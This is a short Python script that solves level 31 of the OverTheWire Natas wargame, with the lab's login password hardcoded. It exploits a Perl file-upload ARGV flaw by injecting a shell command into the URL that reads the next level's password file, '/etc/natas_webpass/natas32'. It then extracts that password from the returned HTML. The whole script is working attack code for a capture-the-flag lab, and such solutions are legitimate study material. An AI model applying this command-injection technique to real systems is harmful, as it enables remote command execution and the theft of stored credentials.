#/bin/python
import requests
import re

user='natas31'
url = f"http://{user}.natas.labs.overthewire.org/index.pl?cat /etc/natas_webpass/natas32 | xargs echo|"
s = requests.Session()
s.auth = (user, 'hay7aecuungiuKaezuathuk9biin0pu1')
data={'file':'ARGV'}
files = [('file', ('my_csv.csv', b'a,b\n1,2'))]
r = s.post(url,data=data,files=files)
password_regex = re.compile(r'<th>(.*)\n</th>')
next_password = password_regex.findall(r.content.decode('utf-8'))[0]
print(next_password)